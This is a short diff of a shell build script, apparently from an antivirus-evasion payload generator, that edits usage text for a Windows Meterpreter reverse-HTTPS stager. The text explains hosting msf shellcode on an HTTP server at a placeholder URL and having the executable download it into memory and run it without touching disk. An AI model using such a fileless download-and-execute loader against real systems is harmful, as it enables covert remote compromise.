@@ -55,15 +55,10 @@ strip output/downloadsocket_mtrprtrxor_revhttps_win64.exe
 # cleanup
 cleanup_techniques
 
-echo "The generated msf shellcode file needs to be hosted on a HTTP server
-Call the executable like:
-downloadsocket_mtrprtrxor_revhttps_win64.exe http://yourserver/thepayload.bin
-The executable downloads the shellcode into memory (no file is dropped on disk) and executes it."
 
-
-#USAGE_START
+echo "
 # The generated msf shellcode file needs to be hosted on a HTTP server
 # Call the executable like:
-# output.exe http://yourserver/thepayload.bin
+# $ downloadsocket_mtrprtrxor_revhttps_win64.exe http://yourserver/thepayload.bin
 # The executable downloads the shellcode into memory (no file is dropped on disk) and executes it.
-#USAGE_END
+"
